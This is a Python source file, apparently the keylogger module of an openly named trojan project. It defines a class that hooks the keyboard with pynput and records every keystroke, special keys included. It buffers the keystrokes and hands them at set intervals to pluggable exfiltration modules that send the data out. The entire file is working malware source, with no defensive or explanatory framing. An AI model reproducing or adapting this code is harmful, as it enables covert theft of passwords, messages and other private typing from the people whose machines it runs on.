#!/usr/bin/env python3
# https://github.com/EONRaider/bca-trojan

__author__ = "EONRaider @ keybase.io/eonraider"

import time

from pynput.keyboard import Key, Listener

from src.modules.exploitation.exploitation_module import ExploitationModule


class KeyLogger(ExploitationModule):
    def __init__(self, *,
                 start_message: str = "Keylogger Initialized",
                 exfil_time: float = None):
        """Set up a keyboard listener that monitors keystroke events
        and send them to pre-configured exfiltration methods.

        Args:
            exfil_time: Time in seconds to wait between periodic
                executions of the exfiltration of logged keystrokes. Set
                to None to perform a single operation.
        """

        super().__init__(exfil_time)
        self.exfil_buffer: list[str] = [start_message]
        '''Mapping of key names to string characters for human-readable 
        text output. Add more mappings as necessary depending on the 
        host and the character set it works with.'''
        self.key_mapping: dict[str: str] = {"space": " "}
        self.listener = Listener(on_press=self._on_press).start()

    def _notify_all_exfiltrators(self) -> None:
        """Send captured data to each registered observer for final
        exfiltration."""
        message: str = self.report()
        self.exfil_buffer.clear()
        [exfiltrator.update(message) for exfiltrator in self._exfiltrators]

    @property
    def contents(self) -> str:
        return "".join(self.exfil_buffer)

    def _on_press(self, key: Key) -> None:
        """Add the string representation of each keystroke captured
        'on press' by the listener thread to the exfiltration buffer."""
        try:  # A key was pressed and caught by the listener
            pressed_key: str = key.char  # The key is alphanumeric
        except AttributeError:  # The key is special
            try:  # Translate the key's value through custom mapping...
                pressed_key = self.key_mapping[key.name]
            except KeyError:  # ... or use the key's name as a result
                try:  # The special key is valid and has a name...
                    pressed_key = f"[{key.name.upper()}]"
                except AttributeError:  # ... or is unknown
                    pressed_key = "[???]"
        self.exfil_buffer.append(pressed_key)

    def execute(self) -> None:
        """Start the keylogger, capture keyboard events and notify all
        registered exfiltrators."""
        while True:
            self._notify_all_exfiltrators()
            try:
                time.sleep(self.exfil_time)
            except TypeError:
                break
